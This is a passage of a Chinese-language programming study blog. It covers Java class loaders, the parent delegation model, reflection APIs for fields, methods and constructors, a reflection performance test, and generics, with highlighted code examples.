class="headerlink" title="类加载器的作用"></a>类加载器的作用</h3><ul><li>引导类加载器： 用c++编写，该加载器无法直接获取</li><li>扩展类加载器：</li><li>系统类加载器</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.reflection;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">//获取系统类的加载器</span><br>        ClassLoader systemClassLoader=ClassLoader.getSystemClassLoader();<br>        System.out.println(systemClassLoader);<br>        <span class="hljs-comment">//获取系统类的加载器的父类加载器----&gt;扩展类加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> systemClassLoader.getParent();<br>        System.out.println(parent);<br><br>        <span class="hljs-comment">//获取扩展类加载器的父类加载器--&gt;根加载器（c/c++写的）</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent1</span> <span class="hljs-operator">=</span> parent.getParent();<br>        System.out.println(parent1);<br><br>        <span class="hljs-comment">//测试当前类的加载器（它是哪个类加载的）</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.zhang.reflection.Test07&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br>        <span class="hljs-comment">//测试jdk内部的类是谁加载的</span><br>        classLoader=Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//获得系统类加载器可以加载的路径</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>双亲委派机制：</p><p>双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</p><hr><h3 id="———"><a href="#———" class="headerlink" title="———"></a>———</h3><h1 id="反射-1"><a href="#反射-1" class="headerlink" title="反射"></a>反射</h1><h4 id="获取类的运行结构"><a href="#获取类的运行结构" class="headerlink" title="获取类的运行结构"></a>获取类的运行结构</h4><ul><li><p>类的名字 </p><p>类对象.getName()</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//通过Class.forName()获得Class对象</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.zhang.reflection.User&quot;</span>);<br><br>        <span class="hljs-comment">//获得类的名字</span><br>        System.out.println(c1.getName());<span class="hljs-comment">//包名+类名</span><br>        System.out.println(c1.getSimpleName());<span class="hljs-comment">//类名</span><br><span class="hljs-comment">//也可以通过new 得到Class对象，获得类名字</span><br><span class="hljs-type">User</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;xiao&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">18</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> u1.getClass();<br>        System.out.println(c2.getName());<br></code></pre></td></tr></table></figure><ul><li><p>类的属性</p><p>类对象.getFields(): 获取所有public属性</p><p>类对象.getDeclaredFields(): 获取所有的属性</p><p>类对象.getDeclaredField(“name”):获取指定的属性</p><p>类对象.getField(“name”)：获得指定的public属性</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获得类的属性  getFields()方法   返回的是数组</span><br>       Field[] fields = c1.getFields(); <span class="hljs-comment">//！！getFields 获得的是public属性</span><br>       fields=c1.getDeclaredFields();<span class="hljs-comment">//!! getDeclaredFields获得的是全部属性</span><br><br>       <span class="hljs-keyword">for</span> (Field field : fields) &#123;<br>           System.out.println(field);<br>       &#125;<br>       System.out.println(<span class="hljs-string">&quot;====&quot;</span>);<br><br>       <span class="hljs-comment">//获得指定属性</span><br>       Field id=c1.getDeclaredField(<span class="hljs-string">&quot;id&quot;</span>);<span class="hljs-comment">//注意有参数的没有 s</span><br>       System.out.println(id);<br></code></pre></td></tr></table></figure><ul><li><p>类的方法</p><p>getMethods()   获取本类及父类的所有public方法</p><p>getDeclaredMethods()  ：获取本类的所有方法</p><p>getMethod(“方法名”，“参数（丢个类型）反射的形式）”)   ： 获取本类及父类的指定public方法</p><p>getDeclaredMethod(“方法名”，“参数（反射的形式）”) ：获取本类的所有方法</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获得类的方法</span><br>        System.out.println(<span class="hljs-string">&quot;====&quot;</span>);<br>        Method[] methods = c1.getMethods();<span class="hljs-comment">//获得本类及其父类的全部public方法</span><br><br>        <span class="hljs-keyword">for</span>(Method m: methods)&#123;<br>            System.out.println(<span class="hljs-string">&quot;正常的&quot;</span>+m);<br>        &#125;<br>        ;<br>        methods=c1.getDeclaredMethods();<span class="hljs-comment">//获得本类的全部方法</span><br>        <span class="hljs-keyword">for</span>(Method m: methods)&#123;<br>            System.out.println(<span class="hljs-string">&quot;getClaredMethods&quot;</span>+m);<br><br>        &#125;<br>        <span class="hljs-comment">//获得指定方法</span><br>        <span class="hljs-comment">//一定需要写方法的参数  有重载的情况</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getName</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;getName&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">setName</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br><br>        System.out.println(getName);<br>        System.out.println(<span class="hljs-string">&quot;===========&quot;</span>);<br><br></code></pre></td></tr></table></figure><ul><li><p>类的构造器</p><p>getConstructors():获得所有public构造器（本类）</p><p>……如有参数,参数也是反射类型的</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获得所有构造器</span><br>       Constructor[] constructor = c1.getConstructors();<br>        <span class="hljs-keyword">for</span>(Constructor c: constructor)&#123;<br>           System.out.println(c);<br>       &#125;<br>       Constructor[] declaredConstructors = c1.getDeclaredConstructors();<br>        <span class="hljs-comment">//获得指定构造器</span><br>       <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<span class="hljs-comment">//参数必须是反射的形式</span><br>       System.out.println(declaredConstructor);<br></code></pre></td></tr></table></figure><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><ul><li><p>getDeclaredField(“属性名”)</p></li><li><p>getDeclaredMethod(“方法名”，参数（class形式的）)</p></li><li><p>getDeclaredConstructor(参数（class形式的）) 构造器与类肯定同名不需要写构造器名了</p></li><li><p>getDeclaredAnnotation(注解(class形式的))  </p><p>注解VS构造器：<br>注解不需要写参数，构造器不需要写构造器名</p></li></ul><hr><h4 id="动态创建对象执行方法"><a href="#动态创建对象执行方法" class="headerlink" title="动态创建对象执行方法"></a>动态创建对象执行方法</h4><ul><li>总结流程就是：<ol><li>先由反射获得Class对象</li><li>Class对象 通过newInstance()(或者借助有参构造器)获得一般对象  （之后备用哈ha）</li><li>获得（抽象【就是由class对象getDeclaredField()得到的】）（其实也就是Method,Field对象）属性&#x2F;方法</li><li>将抽象属性&#x2F;方法&#x2F;构造器 进行（set&#x2F;invoke&#x2F;） 抽象方法激活，抽象属性设置<ul><li>抽象方法.invoke（所属的一般对象,方法的参数值）</li><li>抽象属性.set(所属的一般对象，属性赋值)</li></ul></li></ol></li></ul><p><strong>注意：</strong></p><ol><li><p>操作私有的方法或属性时：需要将程序的安全检验关掉并使用detDeclaredMethod&#x2F;getDeclaredFiled 获取指定私有方法或属性</p><p>Method,Field,Constructor 对象都有setAccessible()方法</p><p>参数值为true则指反射的对象在使用时应该取消Java语言访问检查</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">方法或属性.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//关闭程序的安全及检验只是能对私有方法或属性操作，但并不能直接调用,之后还得借助public的方法</span><br>   <br></code></pre></td></tr></table></figure></li><li><p>class对象.getDeclaredConstructor().newInstance()  之后得到的是Object类型的对象，<strong>需强转成想要的类型</strong></p></li><li><p>得到抽象方法或属性时，注意第二个参数是反射类型的</p></li></ol><p>细节： c1.newInstance()本质调用无参构造器（一定要用无参构造器，且允许访问）—等价于c1.getDeclaredConstructor().newInstance()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取Class对象</span><br>       <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.zhang.reflection.User&quot;</span>);<br>       <span class="hljs-comment">//Class对象创建一般对象  返回的是Object类型的，需强转成User类型的</span><br>       <span class="hljs-type">User</span> <span class="hljs-variable">user1</span> <span class="hljs-operator">=</span> (User)c1.getDeclaredConstructor().newInstance();<span class="hljs-comment">//这里需要注意getDeclaredConstructor()不加参数 本质上是调用的无参构造器，没有public 无参构造器会报错的！！</span><br>       System.out.println(user1);<br><br>       <span class="hljs-comment">//通过有参构造器创建对象</span><br>       <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>       <span class="hljs-type">User</span> <span class="hljs-variable">user2</span> <span class="hljs-operator">=</span>(User) constructor.newInstance(<span class="hljs-string">&quot;xiao&quot;</span>, <span class="hljs-number">001</span>, <span class="hljs-number">18</span>);<br>       System.out.println(user2);<br>       <span class="hljs-comment">//直接调用</span><br>      <span class="hljs-comment">/* user1.setName(&quot;xiao&quot;);</span><br><span class="hljs-comment">       System.out.println(user1.getName());*/</span><br><br>       <span class="hljs-comment">//通过反射调用普通方法</span><br>       <span class="hljs-type">User</span> <span class="hljs-variable">user3</span> <span class="hljs-operator">=</span> (User) c1.getDeclaredConstructor().newInstance();<br>       <span class="hljs-comment">//先获得抽象方法          上面代码这里本质上调用无参构造器</span><br>       <span class="hljs-type">Method</span> <span class="hljs-variable">setName</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br>       <span class="hljs-comment">//激活抽象方法</span><br>      setName.invoke(user3,<span class="hljs-string">&quot;xiao&quot;</span>);<br>       System.out.println(user3.getName());<br>       System.out.println(<span class="hljs-string">&quot;333333333333&quot;</span>);<br>       <br><br><span class="hljs-comment">//操作私有方法试一下</span><br>       <span class="hljs-comment">//1.先得到指定的抽象的方法</span><br>       <span class="hljs-type">Method</span> <span class="hljs-variable">test5</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;test5&quot;</span>);<br>       test5.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//关闭程序的安全及检验只是能对私有方法或属性操作，但并不能直接调用</span><br>       test5.invoke(user3,<span class="hljs-literal">null</span>);<br>       user3.getTest05();<span class="hljs-comment">//调用私有方法它无返回值时一定不能打印！！，直接调用即可</span><br></code></pre></td></tr></table></figure><h4 id="本质记忆"><a href="#本质记忆" class="headerlink" title="本质记忆"></a>本质记忆</h4><p>类Person</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Class c1=Class.forName(<span class="hljs-string">&quot;com.test.classLoad.Person&quot;</span>);<br><span class="hljs-comment">//1.本质使用无参构造器创建对象</span><br>c1.newInstance();<br><span class="hljs-comment">//2.本质还是无参构造器</span><br>c1.getDelaredConstruct().newInstance();<br><span class="hljs-comment">//3.本质使用有参构造器</span><br>c1.getDeclaredConstruct(String.class,<span class="hljs-type">int</span>.class).newInstance(<span class="hljs-string">&quot;zhang&quot;</span>,<span class="hljs-number">18</span>);<br></code></pre></td></tr></table></figure><p>newInstance是往构造器中传参进行初始化</p><h4 id="性能对比"><a href="#性能对比" class="headerlink" title="性能对比"></a>性能对比</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test10</span>&#123;<br><br>    <span class="hljs-comment">//普通测试</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test01</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><br>        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000000</span>; i++) &#123;<br>            user.getName();<br>        &#125;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;普通方式执行&quot;</span>+(end - start));<br>    &#125;<br><br><br>    <span class="hljs-comment">//反射测试</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test02</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        Class&lt;User&gt; c1 = User.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getName</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;getName&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000000</span>; i++) &#123;<br>            getName.invoke(user,<span class="hljs-literal">null</span>);<br>        &#125;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;反射方式执行&quot;</span>+ (end - start));<br>    &#125;<br><br><br>    <span class="hljs-comment">//反射测试  关闭检测</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test03</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        Class&lt;User&gt; c1 = User.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getName</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;getName&quot;</span>, <span class="hljs-literal">null</span>);<br>        getName.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000000</span>; i++) &#123;<br>            getName.invoke(user,<span class="hljs-literal">null</span>);<br>        &#125;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(end - start);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InvocationTargetException, NoSuchMethodException, IllegalAccessException &#123;<br>        test01();<span class="hljs-comment">//3</span><br>        test02();<span class="hljs-comment">//4194</span><br>        test03();<span class="hljs-comment">//3750  关闭点检测能提高点效率</span><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><ul><li>泛型就是表示一种数据类型的数据类型</li><li>泛型俗称“标签”，使用<E>表示。泛型就是在允许定义类，接口时通过一个标识表示某个属性的类型或者是某个方法的返回值或者是参数类型，参数类型在具体使用的时候确定，在使用之前对类型进行检查。</E></li><li>在类声明或实例化对象是只要指定好需要的具体类型即可<ul><li>在类声明时通过一个标识表示类中某个属性的类型或某个方法&#x2F;构造器的返回值类型，参数类型</li></ul></li><li><strong>补充：在Java库中，使用变量E表示集合的元素类型，K和V分别表示关键字和值的类型。T表示任意类型。</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&lt;E&gt;&#123;<br>    E s;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(E s)</span>&#123;<br>        <span class="hljs-built_in">this</span>.s=s;<br>    &#125;<br>    <span class="hljs-keyword">public</span> E <span class="hljs-title function_">f</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;    <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>泛型的声明</p><p>interface接口<T>{} 和class 类&lt;K,V&gt;{}</T></p><p>T,K,V代表类型</p></li><li><p>泛型的好处：</p><ul><li>编译时检查添加的元素的类型，提高了安全性</li><li>减少了类型转换的次数，提高效率</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//ArrayList&lt;Dog&gt; 表示存放到集合ArrayList中的元素都是Dog类型</span><br>        <span class="hljs-comment">//若编译器发现添加的元素不是指定的Dog类型，就会报错的</span><br>        ArrayList&lt;Dog&gt; arrayList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Dog&gt;();<br>        arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;汪汪&quot;</span>,<span class="hljs-number">10</span>));<br>        arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;旺财&quot;</span>,<span class="hljs-number">1</span>));<br>        arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;小汪&quot;</span>,<span class="hljs-number">5</span>));<br>        <span class="hljs-comment">//遍历：之前传统方式直接取Dog类型的会报错，只能取Object类型的然后再向下转，现在就可以直接取Dog类型的啦</span><br>        <span class="hljs-keyword">for</span> (Dog d : arrayList) &#123;<br>            System.out.println(d.getName()+<span class="hljs-string">&quot;:&quot;</span>+d.getAge());<br>        &#125;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> &#123;<br>     <span class="hljs-keyword">private</span> String name;<br>     <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>泛型的分类：</p><ul><li><p>类泛型：类定义中使用类型参数代表具体谁的类型，在实例化类时指定类型参数</p></li><li><p>泛型方法：适用于传许多不同的类型数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Printer</span> &#123;<br>    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(T data)</span> &#123;<br>        System.out.println(data);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用泛型方法打印不同类型的数据</span><br><span class="hljs-type">Printer</span> <span class="hljs-variable">printer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Printer</span>();<br>printer.print(<span class="hljs-string">&quot;Hello&quot;</span>); <span class="hljs-comment">// 打印输出: Hello</span><br><br>printer.print(<span class="hljs-number">123</span>); <span class="hljs-comment">// 打印输出: 123</span><br><br>printer.print(<span class="hljs-number">3.14</span>); <span class="hljs-comment">// 打印输出: 3.14</span><br></code></pre></td></tr></table></figure></li><li><p>泛型接口：<strong>当我们需要定义一个可以适用于不同类型的接口时，就可以使用泛型接口</strong>，在实现类中传具体的数据类型</p><p>eg:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StringBox</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Box</span>&lt;String&gt; <br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="反射获取泛型信息"><a href="#反射获取泛型信息" class="headerlink" title="反射获取泛型信息"></a>反射获取泛型信息</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.reflection;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.ParameterizedType;<br><span class="hljs-keyword">import</span> java.lang.reflect.Type;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-comment">//通过反射获取泛型</span><br><span class="hljs-keyword">public</span> <span 